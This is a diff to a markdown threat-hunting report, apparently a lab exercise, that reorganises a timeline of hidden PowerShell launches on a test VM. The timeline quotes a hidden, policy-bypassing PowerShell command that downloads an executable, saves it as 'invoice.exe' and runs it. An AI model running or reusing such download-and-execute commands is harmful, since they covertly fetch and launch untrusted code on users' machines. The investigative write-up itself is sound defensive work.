@@ -70,40 +70,37 @@ Finally, the query selects and displays only the most relevant columns for inves
 <img width="1491" height="373" alt="image" src="https://github.com/user-attachments/assets/f320c9b6-3adc-4660-bbdb-f225d4d7b0fe" />
 
 ## Chronological Event Timeline
-1 Process Launch - PowerShell Download Attempt
-  * Timestamp: Sep 12, 2025 4:39:12 AM
-  * Event: PowerShell process started on device "arya-vm-onboard" using command-line arguments to download and execute a file.
-  * Command: ```powershell.exe -NoExit -ExecutionPolicy Bypass -WindowStyle Hidden $ErrorActionPreference='silentlycontinue'; (New-Object System.Net.WebClient).DownloadFile('http://127.0.0.1/1.exe', 'C:\test-WDATP-test\invoice.exe'); Start-Process 'C:\test-WDATP-test\invoice.exe'```
+1. PowerShell Download Attempt
+   * Timestamp: Sep 12, 2025 4:39:12 AM
+   * Device: arya-vm-onboard
+   * Event: PowerShell launched with a command to download and execute a file using WebClient.
+   * Process Command Line: ```powershell.exe -NoExit -ExecutionPolicy Bypass -WindowStyle Hidden $ErrorActionPreference='silentlycontinue'; (New-Object System.Net.WebClient).DownloadFile('http://127.0.0.1/1.exe', 'C:\test-WDATP-test\invoice.exe'); Start-Process 'C:\test-WDATP-test\invoice.exe' ```
+   * Account Name: arya
+   * Initiating Process: cmd.exe
 
-User: arya
+2. PowerShell Script Automation (Hidden Window)
+   * Timestamp: Sep 12, 2025 4:40:18 AM
+   * Device: arya-vm-onboard
+   * Event: PowerShell launched with a hidden window, bypassed execution policy, and 'SilentlyContinue' flag for error handling.
+   * Process Command Line: ```"powershell.exe" -NoExit -ExecutionPolicy Bypass -WindowStyle Hidden SilentlyContinue=silentlycontinue```
+   * Account Name: arya
+   * Initiating Process: powershell.exe
 
-2. Process Launch - Elevated PowerShell Script Execution
-Timestamp: Sep 12, 2025 4:48:28 AM
+3. Repeated Script Execution Using Automation Flags
+   * Timestamp: Sep 12, 2025 4:41:13 AM
+   * Device: arya-vm-onboard
+   * Event: Another PowerShell instance started with similar bypass and hidden execution arguments, continuing the pattern of automated actions.
+   * Process Command Line:```"powershell.exe" -NoExit -ExecutionPolicy Bypass -WindowStyle Hidden Continue=silentlycontinue```
+   * Account Name: arya
+   * Initiating Process: powershell.exe
 
-Event: PowerShell running as SYSTEM executed a script that checks SHA256 hash before running a collected script file, indicating possible tampering safeguards.
-
-Command:
-Complex hash-check and script execution command referencing Defender ATP data collection directories.
-
-User: nt authority\system
-
-3. Process Launch - PowerShell Hidden Window
-Timestamp: Sep 12, 2025 4:41:54 AM
-
-Event: Another PowerShell process started with hidden window and bypass policy, suggesting scripted automation.
-
-Command:
-powershell.exe -NoExit -ExecutionPolicy Bypass -WindowStyle Hidden Continue=silentlycontinue
-
-User: arya
-
-4. Additional Script Executions and Attempts
-Timestamps: Multiple between 4:37 AM and 4:54 AM
-
-Events: Additional executions including script hash validation, silent/non-interactive flags, activity as system services, and multiple attempts to run or check PowerShell scripts.
-
-Users: arya, nt authority\system
-
+4. Continued PowerShell Activity (Hidden/Bypass)
+   * Timestamp: Sep 12, 2025 4:41:54 AM
+   * Device: arya-vm-onboard
+   * Event: PowerShell process persists with bypass and hidden execution, using "Continue=silentlycontinue".
+   * Process Command Line:```"powershell.exe" -NoExit -ExecutionPolicy Bypass -WindowStyle Hidden Continue=silentlycontinue```
+   * Account Name: arya
+   * Initiating Process: powershell.exe
 
 
 
